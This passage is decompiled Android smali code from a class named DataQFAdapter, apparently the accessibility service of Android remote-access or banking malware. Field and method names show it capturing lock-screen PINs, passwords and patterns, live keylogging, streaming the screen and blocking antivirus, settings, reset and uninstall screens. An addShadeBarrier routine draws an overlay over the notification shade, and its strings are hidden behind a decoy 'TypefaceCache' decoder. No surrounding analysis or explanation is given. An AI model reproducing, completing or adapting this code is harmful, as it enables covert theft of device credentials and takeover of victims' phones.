    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->serviceStartTime:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getStreamQuality$cp()I
    .locals 1

    .line 1
    sget v0, Lapp/mobilex/plus/services/DataQFAdapter;->streamQuality:I

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getStreamRestartCount$cp()I
    .locals 1

    .line 1
    sget v0, Lapp/mobilex/plus/services/DataQFAdapter;->streamRestartCount:I

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getStreamWidth$cp()I
    .locals 1

    .line 1
    sget v0, Lapp/mobilex/plus/services/DataQFAdapter;->streamWidth:I

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getTAG$cp()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->TAG:Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getUIBlock_A11y$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_A11y:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_AV$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_AV:Z

    nop

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Browser$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Browser:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Dev$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Dev:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Files$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Lock$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Lock:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Net$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Net:Z

    nop

    nop

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_OwnApp$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_OwnApp:Z

    .line 2
    .line 3
    return v0

    nop
.end method

.method public static final synthetic access$getUIBlock_Play$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Play:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Power$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Power:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Recents$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Recents:Z

    .line 2
    .line 3
    return v0

    nop

    nop
.end method

.method public static final synthetic access$getUIBlock_Reset$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Reset:Z

    .line 2
    .line 3
    return v0

    nop

    nop
.end method

.method public static final synthetic access$getUIBlock_Sett$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    nop

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Shade$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getUIBlock_Unin$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    .line 2
    .line 3
    return v0

    nop
.end method

.method public static final synthetic access$getUseH264$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->useH264:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$get_uninstallStartTime$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->_uninstallStartTime:J

    .line 2
    .line 3
    return-wide v0

    nop

    nop
.end method

.method public static final synthetic access$isScreenStreaming$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->isScreenStreaming:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$processPwdPollText(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->processPwdPollText(Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final synthetic access$removeShadeBarrier(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->removeShadeBarrier()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final synthetic access$resolveAppName(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object p0

    .line 5
    return-object p0
.end method

.method public static final synthetic access$safePost(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/Runnable;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->safePost(Ljava/lang/Runnable;)V

    .line 2
    .line 3
    .line 4
    return-void

    nop

    nop
.end method

.method public static final synthetic access$safePostDelayed(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/Runnable;J)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2, p3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Ljava/lang/Runnable;J)V

    return-void
.end method

.method public static final synthetic access$safePostDelayed(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/JRdueaGIH5g8DVCPba;J)V
    .locals 0

    .line 2
    invoke-direct {p0, p1, p2, p3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    return-void
.end method

.method public static final synthetic access$saveUiBlockPrefs(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->saveUiBlockPrefs()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final synthetic access$setAccessOverlayParams$cp(Landroid/view/WindowManager$LayoutParams;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->accessOverlayParams:Landroid/view/WindowManager$LayoutParams;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setAccessWindowManager$cp(Landroid/view/WindowManager;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    nop

    nop

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setAntiUninstallEnabled$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->antiUninstallEnabled:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setBatchTimer$cp(Ljava/util/concurrent/ScheduledExecutorService;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->batchTimer:Ljava/util/concurrent/ScheduledExecutorService;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setCapturedPassword$cp(Ljava/lang/String;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPassword:Ljava/lang/String;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setCapturedPattern$cp(Ljava/lang/String;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPattern:Ljava/lang/String;

    .line 2
    .line 3
    return-void

    nop
.end method

.method public static final synthetic access$setCapturedPin$cp(Ljava/lang/String;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPin:Ljava/lang/String;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setForceStopStartTime$cp(Ljava/lang/Long;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->forceStopStartTime:Ljava/lang/Long;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setH264CaptureInFlight$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->h264CaptureInFlight:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setHwEncoder$cp(Lv/s/lLybWDNhgEj7LwIe;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->hwEncoder:Lv/s/lLybWDNhgEj7LwIe;

    nop

    nop

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastCaptureTsMs$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastCaptureTsMs:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastCapturedDigit$cp(C)V
    .locals 0

    .line 1
    sput-char p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastCapturedDigit:C

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastCapturedDigitTime$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastCapturedDigitTime:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastPasswordCheck$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPasswordCheck:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastPatternCaptureTime$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPatternCaptureTime:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastPatternCheck$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPatternCheck:J

    nop

    nop

    .line 2
    .line 3
    return-void

    nop

    nop
.end method

.method public static final synthetic access$setLastPatternViewBounds$cp(Landroid/graphics/Rect;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPatternViewBounds:Landroid/graphics/Rect;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLastStreamRestartMs$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastStreamRestartMs:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLiveKeylogEnabled$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->liveKeylogEnabled:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setLockPasswordConfirmTimer$cp(Ljava/util/Timer;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->lockPasswordConfirmTimer:Ljava/util/Timer;

    .line 2
    .line 3
    return-void

    nop

    nop
.end method

.method public static final synthetic access$setLockPasswordTime$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->lockPasswordTime:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPasswordPollerActive$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordPollerActive:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPatternOverlayShowing$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->patternOverlayShowing:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPatternReplayInProgress$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->patternReplayInProgress:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPendingForceStop$cp(Ljava/lang/String;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingForceStop:Ljava/lang/String;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPendingInjectPkg$p(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingInjectPkg:Ljava/lang/String;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPendingUninstallPkg$cp(Ljava/lang/String;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    nop

    nop

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPinConfirmTimer$cp(Ljava/util/Timer;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinConfirmTimer:Ljava/util/Timer;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPinDigitsTime$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinDigitsTime:J

    nop

    nop

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPinOverlayDispatching$p(Lapp/mobilex/plus/services/DataQFAdapter;Z)V
    .locals 0

    .line 1
    iput-boolean p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayDispatching:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPrevHardwareBuffer$cp(Landroid/hardware/HardwareBuffer;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->prevHardwareBuffer:Landroid/hardware/HardwareBuffer;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setPrevHwBitmap$cp(Landroid/graphics/Bitmap;)V
    .locals 0

    .line 1
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->prevHwBitmap:Landroid/graphics/Bitmap;

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setProtectionBypassUntil$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setScreenStreaming$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->isScreenStreaming:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setStreamQuality$cp(I)V
    .locals 0

    .line 1
    sput p0, Lapp/mobilex/plus/services/DataQFAdapter;->streamQuality:I

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setStreamRestartCount$cp(I)V
    .locals 0

    .line 1
    sput p0, Lapp/mobilex/plus/services/DataQFAdapter;->streamRestartCount:I

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setStreamWidth$cp(I)V
    .locals 0

    .line 1
    sput p0, Lapp/mobilex/plus/services/DataQFAdapter;->streamWidth:I

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_A11y$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_A11y:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_AV$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_AV:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Browser$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Browser:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Dev$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Dev:Z

    .line 2
    .line 3
    return-void

    nop
.end method

.method public static final synthetic access$setUIBlock_Files$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Lock$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Lock:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Net$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Net:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_OwnApp$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_OwnApp:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Play$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Play:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Power$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Power:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Recents$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Recents:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Reset$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Reset:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Sett$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Shade$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUIBlock_Unin$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$setUseH264$cp(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lapp/mobilex/plus/services/DataQFAdapter;->useH264:Z

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$set_uninstallStartTime$cp(J)V
    .locals 0

    .line 1
    sput-wide p0, Lapp/mobilex/plus/services/DataQFAdapter;->_uninstallStartTime:J

    .line 2
    .line 3
    return-void
.end method

.method public static final synthetic access$stopPwdPoll(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->stopPwdPoll()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private final addShadeBarrier()V
    .locals 11

    .line 1
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z

    .line 2
    .line 3
    if-eqz v0, :cond_0

    nop

    .line 4
    .line 5
    goto/16 :goto_6

    .line 6
    .line 7
    :cond_0
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 8
    .line 9
    if-nez v1, :cond_1

    .line 10
    .line 11
    goto/16 :goto_6

    .line 12
    .line 13
    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 14
    .line 15
    const v2, 0x1e

    nop

    nop

    .line 16
    .line 17
    const/4 v3, 0x1

    .line 18
    if-lt v0, v2, :cond_4

    .line 19
    .line 20
    :try_start_0
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->statusBarOverlay:Lv/s/s50M5De8F5UWQVP09E;

    .line 21
    .line 22
    if-nez v0, :cond_2

    .line 23
    .line 24
    new-instance v0, Lv/s/s50M5De8F5UWQVP09E;

    nop

    nop

    .line 25
    .line 26
    invoke-direct {v0, p0}, Lv/s/s50M5De8F5UWQVP09E;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 27
    .line 28
    .line 29
    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->statusBarOverlay:Lv/s/s50M5De8F5UWQVP09E;

    .line 30
    .line 31
    goto/16 :goto_0

    .line 32
    :catch_0
    move-exception v0

    .line 33
    goto :goto_1

    .line 34
    :cond_2
    :goto_0
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->statusBarOverlay:Lv/s/s50M5De8F5UWQVP09E;

    nop

    nop

    .line 35
    .line 36
    if-eqz v0, :cond_3

    .line 37
    .line 38
    invoke-virtual {v0}, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF()V

    .line 39
    .line 40
    .line 41
    :cond_3
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->statusBarOverlay:Lv/s/s50M5De8F5UWQVP09E;

    .line 42
    .line 43
    if-eqz v0, :cond_4

    .line 44
    .line 45
    iget-boolean v0, v0, Lv/s/s50M5De8F5UWQVP09E;->JXn4Qf7zpnLjP5:Z

    .line 46
    .line 47
    if-ne v0, v3, :cond_4

    .line 48
    .line 49
    iput-boolean v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z

    .line 50
    .line 51
    const-string v0, "00180045007300A600D4009A00EF00E7001000750049008200F500B100C100AF002C0062001B009400E400BE00C600B2003000360059008600E200FF00DD00B1002600640057008600E900FF00D300A40037007F004D0082"

    .line 52
    .line 53
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    .line 55
    .line 56
    return-void

    .line 57
    :goto_1
    const-string v2, "00180045007300A600D4009A00EF00E7001000750049008200F500B100C100AF002C0062001B008800E600BA00C000AB0022006F001B008100F100B600DE00A20027003A001B008100F100B300DE00AE002D0071001B008500F100BC00D900E700370079001B008500F100AD00C000AE00260064000100C7"

    .line 58
    .line 59
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 60
    .line 61
    .line 62
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    :cond_4
    const/4 v0, 0x0

    .line 66
    :try_start_1
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 67
    .line 68
    .line 69
    move-result-object v2

    .line 70
    const-string v4, "00300062005A009300E500AC00ED00A5002200640064008F00F500B600D500AF0037"

    nop

    .line 71
    .line 72
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 73
    .line 74
    .line 75
    move-result-object v4

    .line 76
    const-string v5, "0027007F0056008200FE"

    .line 77
    .line 78
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 79
    .line 80
    .line 81
    move-result-object v5

    .line 82
    const-string v6, "00220078005F009500FF00B600D6"

    .line 83
    .line 84
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 85
    .line 86
    .line 87
    move-result-object v6

    .line 88
    invoke-virtual {v2, v4, v5, v6}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    .line 89
    .line 90
    .line 91
    move-result v2

    .line 92
    if-lez v2, :cond_5

    .line 93
    .line 94
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 95
    .line 96
    .line 97
    move-result-object v4

    .line 98
    invoke-virtual {v4, v2}, Landroid/content/res/Resources;->getDimensionPixelSize(I)I

    .line 99
    .line 100
    .line 101
    move-result v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 102
    goto :goto_2

    nop

    nop

    .line 103
    :catch_1
    :cond_5
    move/from16 v2, v0

    .line 104
    :goto_2
    :try_start_2
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    .line 105
    .line 106
    const/16 v5, 0x1c

    .line 107
    .line 108
    if-lt v4, v5, :cond_9

    .line 109
    .line 110
    :try_start_3
    const-string v5, "window"

    nop

    .line 111
    .line 112
    invoke-virtual {p0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 113
    .line 114
    .line 115
    move-result-object v5

    .line 116
    instance-of v6, v5, Landroid/view/WindowManager;

    .line 117
    .line 118
    const/4 v7, 0x0

    .line 119
    if-eqz v6, :cond_6

    nop

    .line 120
    .line 121
    check-cast v5, Landroid/view/WindowManager;

    .line 122
    .line 123
    goto :goto_3

    .line 124
    :cond_6
    move-object v5, v7

    .line 125
    :goto_3
    if-eqz v5, :cond_7

    .line 126
    .line 127
    invoke-interface {v5}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    .line 128
    .line 129
    .line 130
    move-result-object v5

    .line 131
    goto/16 :goto_4

    .line 132
    :cond_7
    move-object v5, v7

    .line 133
    :goto_4
    const/16 v6, 0x1d

    .line 134
    .line 135
    if-lt v4, v6, :cond_8

    nop

    .line 136
    .line 137
    if-eqz v5, :cond_8

    .line 138
    .line 139
    invoke-static {v5}, Lv/s/JW3Lh9hxwLsO2ArTlH;->b1EoSIRjJHO5(Landroid/view/Display;)Landroid/view/DisplayCutout;

    .line 140
    .line 141
    .line 142
    move-result-object v7

    .line 143
    :cond_8
    if-eqz v7, :cond_9

    .line 144
    .line 145
    invoke-static {v7}, Lv/s/mO9JXzSKOM66Z1;->dDIMxZXP1V8HdM(Landroid/view/DisplayCutout;)I

    .line 146
    .line 147
    .line 148
    move-result v4
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 149
    goto :goto_5

    nop

    nop

    .line 150
    :catch_2
    :cond_9
    move v4, v0

    .line 151
    :goto_5
    :try_start_4
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 152
    .line 153
    .line 154
    move-result-object v5

    .line 155
    invoke-virtual {v5}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 156
    .line 157
    .line 158
    move-result-object v5

    .line 159
    iget v5, v5, Landroid/util/DisplayMetrics;->density:F

    .line 160
    .line 161
    const/16 v6, 0x38

    .line 162
    .line 163
    int-to-float v6, v6

    .line 164
    mul-float/2addr v6, v5

    .line 165
    float-to-int v6, v6

    .line 166
    invoke-static {v4, v6}, Ljava/lang/Math;->max(II)I

    .line 167
    .line 168
    .line 169
    move-result v4

    .line 170
    invoke-static {v2, v4}, Ljava/lang/Math;->max(II)I

    .line 171
    .line 172
    .line 173
    move-result v2

    .line 174
    const/16 v4, 0xc

    nop

    nop

    .line 175
    .line 176
    int-to-float v4, v4

    .line 177
    mul-float/2addr v4, v5

    .line 178
    float-to-int v4, v4

    .line 179
    add-int v7, v2, v4

    .line 180
    .line 181
    new-instance v2, Lv/s/BIhd1C1A2WR7VhK;

    .line 182
    .line 183
    invoke-direct {v2, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 184
    .line 185
    .line 186
    invoke-virtual {v2, v0}, Landroid/view/View;->setBackgroundColor(I)V

    .line 187
    .line 188
    .line 189
    new-instance v4, Lv/s/UX1wumA9o1nH9kfC;

    .line 190
    .line 191
    const/16 v5, 0x0

    .line 192
    invoke-direct {v4, v5, p0}, Lv/s/UX1wumA9o1nH9kfC;-><init>(ILjava/lang/Object;)V

    .line 193
    .line 194
    .line 195
    invoke-virtual {v2, v4}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 196
    .line 197
    .line 198
    new-instance v5, Landroid/view/WindowManager$LayoutParams;

    .line 199
    .line 200
    const v9, 0x40328

    .line 201
    .line 202
    .line 203
    const/16 v10, -0x3

    .line 204
    const/4 v6, -0x1

    .line 205
    const v8, 0x7f0

    .line 206
    .line 207
